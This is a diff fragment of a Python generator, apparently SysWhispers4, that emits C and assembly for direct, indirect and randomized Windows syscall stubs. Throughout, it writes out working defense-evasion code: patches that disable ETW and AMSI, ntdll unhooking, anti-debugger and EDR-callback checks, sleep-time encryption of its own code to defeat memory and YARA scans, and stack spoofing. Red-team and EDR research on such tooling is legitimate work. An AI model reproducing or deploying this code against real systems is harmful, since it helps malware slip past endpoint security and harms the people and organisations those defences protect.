+        PBYTE  pBase = (PBYTE)pImageBase + pSec->VirtualAddress;
+        DWORD  size  = pSec->Misc.VirtualSize;
+        DWORD  oldProt = 0;
+
+        /* Make section writable */
+        if (!VirtualProtect(pBase, size, PAGE_EXECUTE_READWRITE, &oldProt))
+            return FALSE;
+
+        /* Scan and replace eggs */
+        for (DWORD i = 0; i + {p}EGG_SIZE <= size; i++) {{
+            if (memcmp(pBase + i, {p}EggPattern, {p}EGG_SIZE) == 0) {{
+                pBase[i + 0] = 0x0Fu;  /* syscall opcode */
+                pBase[i + 1] = 0x05u;
+                /* Fill remaining 6 bytes with NOPs */
+                for (DWORD j = 2; j < {p}EGG_SIZE; j++)
+                    pBase[i + j] = 0x90u;
+            }}
+        }}
+
+        /* Restore protection */
+        VirtualProtect(pBase, size, oldProt, &oldProt);
+    }}
+    return TRUE;
+}}"""
+
+    # -----------------------------------------------------------------------
+    # Optional ETW bypass
+    # -----------------------------------------------------------------------
+
+    def _c_etw_bypass(self, p: str) -> str:
+        return f"""\
+/* =========================================================================
+ *  ETW user-mode bypass
+ *  Patches ntdll!EtwEventWrite to return STATUS_ACCESS_DENIED immediately,
+ *  suppressing user-mode ETW event delivery from the current process.
+ *
+ *  NOTE: This does NOT bypass kernel-mode ETW-Ti callbacks.
+ *        Use only in authorized penetration testing engagements.
+ * ========================================================================= */
+BOOL {p}PatchEtw(VOID) {{
+    PVOID pNtdll  = {p}GetNtdllBase();
+    PVOID pTarget = {p}GetProcByHash(pNtdll, 0x{djb2_hash('EtwEventWrite'):08X}U);
+    if (!pTarget) return FALSE;
+
+    DWORD oldProt = 0;
+    if (!VirtualProtect(pTarget, 16, PAGE_EXECUTE_READWRITE, &oldProt))
+        return FALSE;
+
+    /* Patch: mov eax, 0xC0000022 (STATUS_ACCESS_DENIED); ret */
+    PBYTE p_patch = (PBYTE)pTarget;
+    p_patch[0] = 0xB8u;
+    *(DWORD*)(p_patch + 1) = 0xC0000022u;  /* STATUS_ACCESS_DENIED */
+    p_patch[5] = 0xC3u;                    /* ret */
+
+    VirtualProtect(pTarget, 16, oldProt, &oldProt);
+    return TRUE;
+}}"""
+
+    # -----------------------------------------------------------------------
+    # NEW: AMSI bypass
+    # -----------------------------------------------------------------------
+
+    def _c_amsi_bypass(self, p: str) -> str:
+        return f"""\
+/* =========================================================================
+ *  AMSI bypass
+ *  Patches amsi.dll!AmsiScanBuffer to always return AMSI_RESULT_CLEAN.
+ *  If amsi.dll is not loaded, it returns TRUE (nothing to patch).
+ *
+ *  Technique: Overwrite AmsiScanBuffer with:
+ *    xor eax, eax     (B8 00 00 00 80 -> mov eax, 0x80004005 replaced)
+ *    ret
+ *
+ *  NOTE: Use only in authorized penetration testing engagements.
+ * ========================================================================= */
+BOOL {p}PatchAmsi(VOID) {{
+    /* Find amsi.dll -- it may not be loaded yet */
+    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
+    if (!hAmsi) {{
+        /* Try loading -- some processes load it lazily */
+        hAmsi = LoadLibraryA("amsi.dll");
+        if (!hAmsi) return TRUE;  /* Not present, nothing to patch */
+    }}
+
+    /* Find AmsiScanBuffer using hash */
+    PVOID pTarget = {p}GetProcByHash((PVOID)hAmsi, 0x{djb2_hash('AmsiScanBuffer'):08X}U);
+    if (!pTarget) return FALSE;
+
+    DWORD oldProt = 0;
+    if (!VirtualProtect(pTarget, 16, PAGE_EXECUTE_READWRITE, &oldProt))
+        return FALSE;
+
+    /* Patch: mov eax, 0x80070057 (E_INVALIDARG); ret
+     * This makes AMSI think the scan arguments are invalid -> skip scan */
+    PBYTE patch = (PBYTE)pTarget;
+    patch[0] = 0xB8u;                         /* mov eax, imm32 */
+    *(DWORD*)(patch + 1) = 0x80070057u;       /* E_INVALIDARG */
+    patch[5] = 0xC3u;                         /* ret */
+
+    VirtualProtect(pTarget, 16, oldProt, &oldProt);
+    return TRUE;
+}}"""
+
+    # -----------------------------------------------------------------------
+    # NEW: ntdll Unhooking (remap clean .text from KnownDlls)
+    # -----------------------------------------------------------------------
+
+    def _c_unhook_ntdll(self, p: str) -> str:
+        return f"""\
+/* =========================================================================
+ *  ntdll Unhooking
+ *  Maps a clean copy of ntdll from \\KnownDlls\\ntdll.dll and overwrites
+ *  the .text section of the in-memory (hooked) ntdll with the clean bytes.
+ *
+ *  This completely removes ALL inline hooks from ntdll, making all
+ *  subsequent NT API calls go through the original code paths.
+ *
+ *  Flow:
+ *    1. Open \\KnownDlls\\ntdll.dll section
+ *    2. Map clean copy read-only
+ *    3. Find .text section in both copies
+ *    4. VirtualProtect in-memory .text to RWX
+ *    5. memcpy clean .text over hooked .text
+ *    6. Restore original protection
+ *    7. Unmap clean copy
+ *
+ *  NOTE: Call BEFORE {p}Initialize() for best results (clean SSN resolution).
+ *        Use only in authorized penetration testing engagements.
+ * ========================================================================= */
+BOOL {p}UnhookNtdll(VOID) {{
+    /* We need the real ntdll functions to map the clean copy.
+     * Even if hooked, they still work -- hooks just monitor/log. */
+    typedef NTSTATUS (NTAPI *pfnNtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
+    typedef NTSTATUS (NTAPI *pfnNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
+    typedef NTSTATUS (NTAPI *pfnNtUnmapViewOfSection)(HANDLE, PVOID);
+    typedef NTSTATUS (NTAPI *pfnNtClose)(HANDLE);
+
+    PVOID pNtdll = {p}GetNtdllBase();
+    if (!pNtdll) return FALSE;
+
+    pfnNtOpenSection pOpen = (pfnNtOpenSection){p}GetProcByHash(pNtdll, 0x{djb2_hash('NtOpenSection'):08X}U);
+    pfnNtMapViewOfSection pMap = (pfnNtMapViewOfSection){p}GetProcByHash(pNtdll, 0x{djb2_hash('NtMapViewOfSection'):08X}U);
+    pfnNtUnmapViewOfSection pUnmap = (pfnNtUnmapViewOfSection){p}GetProcByHash(pNtdll, 0x{djb2_hash('NtUnmapViewOfSection'):08X}U);
+    pfnNtClose pClose = (pfnNtClose){p}GetProcByHash(pNtdll, 0x{djb2_hash('NtClose'):08X}U);
+
+    if (!pOpen || !pMap || !pUnmap || !pClose) return FALSE;
+
+    /* Open clean ntdll from KnownDlls */
+    UNICODE_STRING usName;
+    usName.Length        = 24 * sizeof(WCHAR);
+    usName.MaximumLength = usName.Length + sizeof(WCHAR);
+    usName.Buffer        = L"\\\\KnownDlls\\\\ntdll.dll";
+
+    OBJECT_ATTRIBUTES oa;
+    memset(&oa, 0, sizeof(oa));
+    oa.Length     = sizeof(OBJECT_ATTRIBUTES);
+    oa.ObjectName = &usName;
+
+    HANDLE hSection = NULL;
+    NTSTATUS status = pOpen(&hSection, SECTION_MAP_READ, &oa);
+    if (!NT_SUCCESS(status)) return FALSE;
+
+    PVOID  pClean = NULL;
+    SIZE_T viewSize = 0;
+    status = pMap(hSection, (HANDLE)-1, &pClean, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);
+    if (!NT_SUCCESS(status)) {{
+        pClose(hSection);
+        return FALSE;
+    }}
+
+    /* Find .text section in both copies */
+    PIMAGE_SECTION_HEADER pSecHooked = {p}FindSection(pNtdll, ".text");
+    PIMAGE_SECTION_HEADER pSecClean  = {p}FindSection(pClean, ".text");
+
+    if (!pSecHooked || !pSecClean) {{
+        pUnmap((HANDLE)-1, pClean);
+        pClose(hSection);
+        return FALSE;
+    }}
+
+    /* Overwrite hooked .text with clean .text */
+    PBYTE pDst = (PBYTE)pNtdll + pSecHooked->VirtualAddress;
+    PBYTE pSrc = (PBYTE)pClean + pSecClean->VirtualAddress;
+    DWORD dwSize = pSecClean->Misc.VirtualSize;
+
+    DWORD oldProt = 0;
+    if (!VirtualProtect(pDst, dwSize, PAGE_EXECUTE_READWRITE, &oldProt)) {{
+        pUnmap((HANDLE)-1, pClean);
+        pClose(hSection);
+        return FALSE;
+    }}
+
+    memcpy(pDst, pSrc, dwSize);
+    VirtualProtect(pDst, dwSize, oldProt, &oldProt);
+
+    /* Cleanup */
+    pUnmap((HANDLE)-1, pClean);
+    pClose(hSection);
+    return TRUE;
+}}"""
+
+    # -----------------------------------------------------------------------
+    # NEW: Anti-debug checks
+    # -----------------------------------------------------------------------
+
+    def _c_anti_debug(self, p: str) -> str:
+        canary = self.obf.generate_canary()
+        return f"""\
+/* =========================================================================
+ *  Anti-debugging checks
+ *  Performs multiple checks to detect debugger presence:
+ *    1. PEB.BeingDebugged flag
+ *    2. PEB.NtGlobalFlag (typical debugger flags)
+ *    3. RDTSC timing check (detect single-stepping)
+ *    4. NtQueryInformationProcess(ProcessDebugPort)
+ *    5. Heap flags check
+ *    6. Instrumentation callback detection
+ *
+ *  Returns TRUE if environment appears clean, FALSE if debugger detected.
+ * ========================================================================= */
+
+/* Canary value for integrity validation */
+#define {p}CANARY 0x{canary:08X}U
+
+BOOL {p}AntiDebugCheck(VOID) {{
+    PPEB pPeb;
+#if defined(_WIN64)
+    pPeb = (PPEB)__readgsqword(0x60);
+#else
+    pPeb = (PPEB)__readfsdword(0x30);
+#endif
+
+    /* Check 1: PEB.BeingDebugged */
+    if (pPeb->BeingDebugged)
+        return FALSE;
+
+    /* Check 2: NtGlobalFlag -- debuggers often set 0x70 (FLG_HEAP_*) */
+#if defined(_WIN64)
+    DWORD ntGlobalFlag = *(DWORD*)((PBYTE)pPeb + 0xBC);
+#else
+    DWORD ntGlobalFlag = *(DWORD*)((PBYTE)pPeb + 0x68);
+#endif
+    if (ntGlobalFlag & 0x70)
+        return FALSE;
+
+    /* Check 3: RDTSC timing -- single-stepping causes large deltas */
+    ULONGLONG tsc1, tsc2;
+    tsc1 = __rdtsc();
+    /* Dummy operations to create measurable interval */
+    volatile DWORD dummy = 0;
+    for (int i = 0; i < 100; i++) dummy += i;
+    tsc2 = __rdtsc();
+    /* Threshold: > 10000 cycles suggests debugging */
+    if ((tsc2 - tsc1) > 10000)
+        return FALSE;
+
+    /* Check 4: NtQueryInformationProcess(ProcessDebugPort) */
+    typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
+        HANDLE, DWORD, PVOID, ULONG, PULONG);
+    PVOID pNtdll = {p}GetNtdllBase();
+    pfnNtQueryInformationProcess pQip = (pfnNtQueryInformationProcess)
+        {p}GetProcByHash(pNtdll, 0x{djb2_hash('NtQueryInformationProcess'):08X}U);
+    if (pQip) {{
+        DWORD_PTR debugPort = 0;
+        NTSTATUS status = pQip((HANDLE)-1, 7 /* ProcessDebugPort */,
+                              &debugPort, sizeof(debugPort), NULL);
+        if (NT_SUCCESS(status) && debugPort != 0)
+            return FALSE;
+    }}
+
+    /* Check 5: Heap flags */
+    PVOID pHeap;
+#if defined(_WIN64)
+    pHeap = *(PVOID*)((PBYTE)pPeb + 0x30);
+    DWORD heapFlags = *(DWORD*)((PBYTE)pHeap + 0x70);
+#else
+    pHeap = *(PVOID*)((PBYTE)pPeb + 0x18);
+    DWORD heapFlags = *(DWORD*)((PBYTE)pHeap + 0x40);
+#endif
+    if (heapFlags & ~0x02)  /* Only HEAP_GROWABLE should be set */
+        return FALSE;
+
+    /* Check 6: Instrumentation callback -- EDRs may set this */
+    typedef NTSTATUS (NTAPI *pfnNtQip)(HANDLE, DWORD, PVOID, ULONG, PULONG);
+    pfnNtQip pQip2 = (pfnNtQip)pQip;
+    if (pQip2) {{
+        BYTE buffer[64];
+        memset(buffer, 0, sizeof(buffer));
+        NTSTATUS status = pQip2((HANDLE)-1, 40 /* ProcessInstrumentationCallback */,
+                                buffer, sizeof(buffer), NULL);
+        /* If the callback pointer is non-NULL, something is monitoring */
+        if (NT_SUCCESS(status)) {{
+            PVOID pCallback = *(PVOID*)(buffer + sizeof(PVOID));
+            if (pCallback != NULL)
+                return FALSE;
+        }}
+    }}
+
+    return TRUE;
+}}"""
+
+    # -----------------------------------------------------------------------
+    # NEW: Sleep encryption (Ekko-style)
+    # -----------------------------------------------------------------------
+
+    def _c_sleep_encrypt(self, p: str) -> str:
+        return f"""\
+/* =========================================================================
+ *  Sleep with memory encryption (Ekko-style)
+ *  Encrypts the PE's .text section during sleep to evade memory scanners.
+ *
+ *  Flow:
+ *    1. Generate a random XOR key
+ *    2. Encrypt own .text section with XOR
+ *    3. Create a waitable timer with the specified delay
+ *    4. Queue APC to decrypt .text after timer fires
+ *    5. Sleep (NtWaitForSingleObject on timer)
+ *    6. APC fires -> decrypts .text -> execution continues
+ *
+ *  This defeats:
+ *    - Memory scanners during sleep (code is encrypted)
+ *    - Periodic module scans
+ *    - YARA/signature scans on in-memory PE
+ *
+ *  NOTE: Simplified version -- production use should use ROP chain
+ *  (NtContinue + timer APCs) for full Ekko/Foliage behavior.
+ * ========================================================================= */
+
+/* State for sleep encryption */
+static PBYTE  {p}SleepTextBase = NULL;
+static DWORD  {p}SleepTextSize = 0;
+static DWORD  {p}SleepXorKey   = 0;
+
+/* XOR encrypt/decrypt .text section */
+static VOID {p}XorTextSection(VOID) {{
+    if (!{p}SleepTextBase || !{p}SleepTextSize) return;
+
+    DWORD oldProt = 0;
+    VirtualProtect({p}SleepTextBase, {p}SleepTextSize, PAGE_EXECUTE_READWRITE, &oldProt);
+
+    DWORD key = {p}SleepXorKey;
+    PDWORD pData = (PDWORD){p}SleepTextBase;
+    DWORD  count = {p}SleepTextSize / sizeof(DWORD);
+
+    for (DWORD i = 0; i < count; i++)
+        pData[i] ^= key;
+
+    VirtualProtect({p}SleepTextBase, {p}SleepTextSize, oldProt, &oldProt);
+}}
+
+/* APC callback to decrypt after sleep */
+static VOID CALLBACK {p}SleepDecryptApc(ULONG_PTR param) {{
+    (void)param;
+    {p}XorTextSection();  /* XOR again = decrypt */
+}}
+
+VOID {p}SleepEncrypt(DWORD dwMilliseconds) {{
+    /* Find own .text section */
+    PVOID pImageBase = {p}GetOwnImageBase();
+    PIMAGE_SECTION_HEADER pSec = {p}FindSection(pImageBase, ".text");
+    if (!pSec) {{
+        /* Fallback: regular sleep */
+        Sleep(dwMilliseconds);
+        return;
+    }}
+
+    {p}SleepTextBase = (PBYTE)pImageBase + pSec->VirtualAddress;
+    {p}SleepTextSize = pSec->Misc.VirtualSize;
+
+    /* Generate random XOR key using RDTSC */
+    ULONGLONG tsc = __rdtsc();
+    {p}SleepXorKey = (DWORD)(tsc ^ (tsc >> 32));
+    if ({p}SleepXorKey == 0) {p}SleepXorKey = 0xDEADBEEF;
+
+    /* Create waitable timer */
+    HANDLE hTimer = CreateWaitableTimerW(NULL, TRUE, NULL);
+    if (!hTimer) {{
+        Sleep(dwMilliseconds);
+        return;
+    }}
+
+    /* Set timer: negative value = relative time in 100ns units */
+    LARGE_INTEGER dueTime;
+    dueTime.QuadPart = -(LONGLONG)dwMilliseconds * 10000LL;
+
+    if (!SetWaitableTimer(hTimer, &dueTime, 0, {p}SleepDecryptApc, NULL, FALSE)) {{
+        CloseHandle(hTimer);
+        Sleep(dwMilliseconds);
+        return;
+    }}
+
+    /* Encrypt .text section */
+    {p}XorTextSection();
+
+    /* Sleep in alertable state (allows APC to fire) */
+    SleepEx(dwMilliseconds, TRUE);
+
+    /* In case APC didn't fire, decrypt manually */
+    /* (Check a canary byte to see if still encrypted) */
+    PBYTE pCheck = (PBYTE)&{p}SleepEncrypt;
+    if (*pCheck != 0x48 && *pCheck != 0x40 && *pCheck != 0x55) {{
+        /* Likely still encrypted */
+        {p}XorTextSection();
+    }}
+
+    CloseHandle(hTimer);
+}}"""
+
+    # -----------------------------------------------------------------------
+    # Initialize function
+    # -----------------------------------------------------------------------
+
+    def _c_initialize(self, p: str) -> str:
+        resolve_map = {
+            ResolutionMethod.Static:          f"return {p}StaticResolve();",
+            ResolutionMethod.FreshyCalls:     f"return {p}FreshyCalls(pNtdll);",
+            ResolutionMethod.HellsGate:       f"return {p}HellsGate(pNtdll);",
+            ResolutionMethod.HalosGate:       f"return {p}HalosGate(pNtdll);",
+            ResolutionMethod.TartarusGate:    f"return {p}TartarusGate(pNtdll);",
+            ResolutionMethod.SyscallsFromDisk:f"return {p}SyscallsFromDisk(pNtdll);",
+            ResolutionMethod.RecycledGate:    f"return {p}RecycledGate(pNtdll);",
+            ResolutionMethod.HWBreakpoint:    f"return {p}HWBreakpoint(pNtdll);",
+        }
+        resolve_call = resolve_map[self.cfg.resolve]
+
+        gadget_pool = ""
+        if self.cfg.method == InvocationMethod.Randomized:
+            gadget_pool = f"\n    {p}BuildGadgetPool(pNtdll);"
+
+        ntdll_needed = self.cfg.resolve != ResolutionMethod.Static
+        ntdll_decl = f"    PVOID pNtdll = {p}GetNtdllBase();\n    if (!pNtdll) return FALSE;\n" if ntdll_needed else ""
+
+        return f"""\
+/* =========================================================================
+ *  {p}Initialize -- call once at process/shellcode startup
+ * ========================================================================= */
+BOOL {p}Initialize(VOID) {{
+{ntdll_decl}{gadget_pool}
+    {resolve_call}
+}}"""
+
+    # -----------------------------------------------------------------------
+    # 4a. ASM Generation -- MSVC / MASM
+    # -----------------------------------------------------------------------
+
+    def _gen_asm_msvc(self) -> str:
+        if self.cfg.arch == Architecture.x64:
+            return self._gen_asm_msvc_x64()
+        elif self.cfg.arch == Architecture.x86:
+            return self._gen_asm_msvc_x86()
+        elif self.cfg.arch == Architecture.ARM64:
+            return self._gen_asm_arm64_msvc()
+        else:
+            return self._gen_asm_msvc_x64()  # WoW64 -> x64 stubs
+
+    def _gen_asm_msvc_x64(self) -> str:
+        p = self.cfg.prefix
+        method = self.cfg.method
+        egg_val = self.obf.generate_egg() if method == InvocationMethod.Egg else 0
+
+        header = f"""\
+; {self.cfg.out_file}.asm -- generated by SysWhispers4
+; Method     : {method}
+; Resolution : {self.cfg.resolve}
+; Arch       : x64 / MASM (ml64.exe)
+;
+; Build: cl /nologo ... {self.cfg.out_file}.c {self.cfg.out_file}.asm
+;        (ensure MASM64 is enabled in project settings)
+
+OPTION DOTNAME
+
+.data
+    EXTERN {p}SsnTable:DWORD
+"""
+        if method == InvocationMethod.Indirect:
+            header += f"    EXTERN {p}SyscallAddrTable:QWORD\n"
+        elif method == InvocationMethod.Randomized:
+            header += (
+                f"    EXTERN {p}GadgetPool:QWORD\n"
+                f"    EXTERN {p}GadgetPoolCount:DWORD\n"
+            )
+
+        header += "\n.code\n\n"
+
+        stubs = []
+        for idx, proto in enumerate(self._prototypes):
+            fname = f"{p}{proto.name}"
+            junk = f"    {self.obf.junk_nops()}\n" if self.cfg.obfuscate else ""
+
+            if method == InvocationMethod.Embedded:
+                stub = self._asm_x64_embedded(fname, idx, p, junk)
+            elif method == InvocationMethod.Indirect:
+                stub = self._asm_x64_indirect(fname, idx, p, junk)
+            elif method == InvocationMethod.Randomized:
+                stub = self._asm_x64_randomized(fname, idx, p, junk)
+            elif method == InvocationMethod.Egg:
+                stub = self._asm_x64_egg(fname, idx, p, egg_val, junk)
+            else:
+                stub = self._asm_x64_embedded(fname, idx, p, junk)
+
+            stubs.append(stub)
+
+        if self.cfg.stack_spoof:
+            header += self._asm_stack_spoof_helper(p)
+
+        return header + "\n".join(stubs) + "\nEND\n"
+
+    def _asm_x64_embedded(self, fname: str, idx: int, p: str, junk: str) -> str:
+        decrypt = f"{p}DECRYPT" if self.cfg.encrypt_ssn else ""
+        if self.cfg.encrypt_ssn:
+            load_ssn = (
+                f"    mov eax, DWORD PTR [{p}SsnTable + {idx * 4}]  ; load encrypted SSN\n"
+                f"    xor eax, {p}XOR_KEY                           ; decrypt"
+            )
+        else:
+            load_ssn = f"    mov eax, DWORD PTR [{p}SsnTable + {idx * 4}]  ; load SSN"
+
+        return f"""\
+; --- {fname} (direct/embedded syscall) ---
+{fname} PROC
+    mov r10, rcx                            ; syscall ABI: arg1 -> r10
+{junk}{load_ssn}
+    syscall
+    ret
+{fname} ENDP
+
+"""
+
+    def _asm_x64_indirect(self, fname: str, idx: int, p: str, junk: str) -> str:
+        if self.cfg.encrypt_ssn:
+            load_ssn = (
+                f"    mov eax, DWORD PTR [{p}SsnTable + {idx * 4}]  ; load encrypted SSN\n"
+                f"    xor eax, {p}XOR_KEY                           ; decrypt"
+            )
+        else:
+            load_ssn = f"    mov eax, DWORD PTR [{p}SsnTable + {idx * 4}]  ; load SSN"
+
+        return f"""\
+; --- {fname} (indirect: jmp to syscall;ret in ntdll) ---
+{fname} PROC
+    mov r10, rcx                            ; syscall ABI: arg1 -> r10
+{junk}{load_ssn}
+    jmp QWORD PTR [{p}SyscallAddrTable + {idx * 8}]     ; -> ntdll gadget
+{fname} ENDP
+
+"""
+
+    def _asm_x64_randomized(self, fname: str, idx: int, p: str, junk: str) -> str:
+        if self.cfg.encrypt_ssn:
+            load_ssn = (
+                f"    mov  eax, DWORD PTR [{p}SsnTable + {idx * 4}]  ; encrypted SSN\n"
+                f"    xor  eax, {p}XOR_KEY                           ; decrypt"
+            )
+        else:
+            load_ssn = f"    mov  eax, DWORD PTR [{p}SsnTable + {idx * 4}]  ; eax = SSN"
+
+        return f"""\
+; --- {fname} (randomized indirect: random ntdll syscall;ret gadget) ---
+; rdtsc is used for entropy; r11 is caller-saved (volatile) and safe to use.
+{fname} PROC
+    mov  r10, rcx                           ; arg1 -> r10 (syscall ABI)
+    mov  r11, rdx                           ; save arg2 (rdx trashed by rdtsc)
+{junk}    rdtsc                                   ; eax = TSC_low, edx = TSC_high
+    xor  eax, edx                           ; mix
+    and  eax, {(64 - 1):d}                          ; = GADGET_MASK (pool must be power of 2)
+    lea  rcx, [{p}GadgetPool]               ; rcx = &gadget_pool[0]
+    mov  rcx, QWORD PTR [rcx + rax*8]      ; rcx = random gadget address
+    mov  rdx, r11                           ; restore arg2
+{load_ssn}
+    jmp  rcx                                ; -> random ntdll syscall;ret
+{fname} ENDP
+
+"""
+
+    def _asm_x64_egg(self, fname: str, idx: int, p: str, egg: int, junk: str) -> str:
+        egg_bytes = Obfuscator.egg_asm_bytes(egg)
+        if self.cfg.encrypt_ssn:
+            load_ssn = (
+                f"    mov eax, DWORD PTR [{p}SsnTable + {idx * 4}]  ; encrypted SSN\n"
+                f"    xor eax, {p}XOR_KEY                           ; decrypt"
+            )
+        else:
+            load_ssn = f"    mov eax, DWORD PTR [{p}SsnTable + {idx * 4}]  ; load SSN"
+
+        return f"""\
+; --- {fname} (egg: placeholder replaced with syscall at runtime) ---
+; SW4HatchEggs() replaces the EGG below with: 0F 05 90 90 90 90 90 90
+{fname} PROC
+    mov r10, rcx                            ; syscall ABI: arg1 -> r10
+{junk}{load_ssn}
+    {egg_bytes}           ; EGG -- will become: syscall + 6 NOPs
+    ret
+{fname} ENDP
+
+"""
+
+    def _asm_stack_spoof_helper(self, p: str) -> str:
+        return f"""\
+; =========================================================================
+; Stack spoofing helper (synthetic frame)
+; On entry: rax = target function address to call
+;           All other registers set up for target
+; Pushes a fake return address into ntdll before jumping to target.
+; =========================================================================
+EXTERN {p}SpoofReturnAddr:QWORD   ; Pre-populated with a ntdll gadget addr
+
+{p}CallWithSpoofedStack PROC
+    pop  r11                ; save real return address in r11
+    push QWORD PTR [{p}SpoofReturnAddr]  ; fake return address
+    push r11                ; push real address below (not on visible stack)
+    jmp  rax                ; jump to target (stack top = fake addr)
+{p}CallWithSpoofedStack ENDP
+
+"""
+
+    def _gen_asm_msvc_x86(self) -> str:
+        """x86 stubs using SYSENTER (Heaven's Gate compatible)."""
+        p = self.cfg.prefix
+        method = self.cfg.method
+        egg_val = self.obf.generate_egg() if method == InvocationMethod.Egg else 0
+
+        header = f"""\
+; {self.cfg.out_file}.x86.asm -- generated by SysWhispers4
+; Method : {method}  |  Arch : x86 MASM (ml.exe)
+.386
+.model flat, stdcall
+OPTION DOTNAME
+
+.data
+    EXTERN {p}SsnTable:DWORD
+
+.code
+
+"""
+        stubs = []
+        for idx, proto in enumerate(self._prototypes):
+            fname = f"{p}{proto.name}"
+            n_args = proto.param_count
+            stubs.append(self._asm_x86_stub(fname, idx, p, n_args, method, egg_val))
+
+        return header + "\n".join(stubs) + "\nEND\n"
+
+    def _asm_x86_stub(self, fname: str, idx: int, p: str,
+                      n_args: int, method: InvocationMethod, egg: int) -> str:
+        stack_arg_bytes = n_args * 4
+
+        if method == InvocationMethod.Embedded:
+            invoke = "    sysenter\n    ret"
+        elif method == InvocationMethod.Egg:
+            egg_bytes = Obfuscator.egg_asm_bytes(egg)
+            invoke = f"    {egg_bytes}  ; EGG\n    ret"
+        else:
+            invoke = "    sysenter\n    ret"  # x86 indirect via sysenter
+
+        return f"""\
+; --- {fname} (x86) ---
+{fname} PROC
+    push ebp
+    mov  ebp, esp
+    mov  eax, DWORD PTR [{p}SsnTable + {idx * 4}]
+    ; Copy stack arguments for kernel (args start at [ebp+8])
+    lea  edx, DWORD PTR [ebp+8]
+    push edx                ; edx -> arg block
+{invoke}
+    pop  ebp
+    ret  {stack_arg_bytes}
+{fname} ENDP
+
+"""
+
+    def _gen_asm_arm64_msvc(self) -> str:
+        """ARM64 stubs using SVC #0."""
+        p = self.cfg.prefix
+        header = f"""\
+; {self.cfg.out_file}.arm64.asm -- generated by SysWhispers4
+; ARM64 MASM syntax (armasm64.exe)
+; Arch: ARM64  |  Instruction: SVC #0  |  SSN register: w8
+
+    AREA |.text|, CODE, READONLY
+
+    EXTERN {p}SsnTable
+
+"""
+        stubs = []
+        for idx, proto in enumerate(self._prototypes):
+            fname = f"{p}{proto.name}"
+            stubs.append(self._asm_arm64_stub(fname, idx, p))
+
+        return header + "\n".join(stubs) + "\n    END\n"
+
+    def _asm_arm64_stub(self, fname: str, idx: int, p: str) -> str:
+        byte_offset = idx * 4
+        return f"""\
+; --- {fname} (ARM64) ---
+    EXPORT {fname}
+{fname} PROC
+    ; ARM64 syscall ABI: x0-x7 = args, w8 = SSN, svc #0
+    adrp  x9, {p}SsnTable
+    add   x9, x9, :lo12:{p}SsnTable
+    ldr   w8, [x9, #{byte_offset}]  ; w8 = SSN
+    svc   #0                         ; syscall
+    ret
+    ENDP
+
+"""
+
+    # -----------------------------------------------------------------------
+    # 4b. ASM Generation -- MinGW / Clang (GAS inline asm in C)
+    # -----------------------------------------------------------------------
+
+    def _gen_asm_gas_inline(self) -> str:
+        p = self.cfg.prefix
+        method = self.cfg.method
+        egg_val = self.obf.generate_egg() if method == InvocationMethod.Egg else 0
+
+        header = f"""\
+/*
+ * {self.cfg.out_file}_stubs.c -- generated by SysWhispers4
+ * MinGW/Clang inline assembly stubs (GAS AT&T syntax -> Intel via -masm=intel)
+ *
+ * Compile with: -masm=intel
+ */
+#include "{self.cfg.out_file}.h"
+
+extern DWORD {p}SsnTable[];
+"""
+        if method in (InvocationMethod.Indirect, InvocationMethod.Randomized):
+            header += f"extern void* {p}SyscallAddrTable[];\n"
+
+        stubs = [header]
+        for idx, proto in enumerate(self._prototypes):
+            stubs.append(self._gas_stub(proto, idx, p, method, egg_val))
+
+        return "\n".join(stubs)
+
+    def _gas_stub(self, proto: SyscallPrototype, idx: int, p: str,
+                  method: InvocationMethod, egg: int) -> str:
+        fname = f"{p}{proto.name}"
+        param_list = ", ".join(p_arg.c_declaration() for p_arg in proto.params)
+        func_sig = f"__declspec(naked) {proto.return_type} NTAPI {fname}({param_list})"
+
+        if method == InvocationMethod.Embedded:
+            asm_body = f"""\
+    __asm__ __volatile__ (
+        "mov r10, rcx\\n"
+        "mov eax, [{p}SsnTable + {idx * 4}]\\n"
+        "syscall\\n"
+        "ret\\n"
+        ::: "memory"
+    );"""
+        elif method == InvocationMethod.Indirect:
+            asm_body = f"""\
+    __asm__ __volatile__ (
+        "mov r10, rcx\\n"
+        "mov eax, [{p}SsnTable + {idx * 4}]\\n"
+        "jmp qword ptr [{p}SyscallAddrTable + {idx * 8}]\\n"
+        ::: "memory"
+    );"""
+        elif method == InvocationMethod.Randomized:
+            asm_body = f"""\
+    __asm__ __volatile__ (
+        "mov r10, rcx\\n"
+        "mov r11, rdx\\n"
+        "rdtsc\\n"
+        "xor eax, edx\\n"
+        "and eax, 63\\n"
+        "lea rcx, [{p}GadgetPool]\\n"
+        "mov rcx, qword ptr [rcx + rax*8]\\n"
+        "mov rdx, r11\\n"
+        "mov eax, [{p}SsnTable + {idx * 4}]\\n"
+        "jmp rcx\\n"
+        ::: "memory"
+    );"""
+        else:
+            # Egg: GAS DB equivalent
+            egg_bytes_list = list(egg.to_bytes(8, "little"))
+            asm_body = f"""\
+    __asm__ __volatile__ (
+        "mov r10, rcx\\n"
+        "mov eax, [{p}SsnTable + {idx * 4}]\\n"
+        ".byte {', '.join(str(b) for b in egg_bytes_list)}\\n"  /* EGG */
+        "ret\\n"
+        ::: "memory"
+    );"""
+
+        return f"""\
+{func_sig} {{
+{asm_body}
+}}
+
+"""
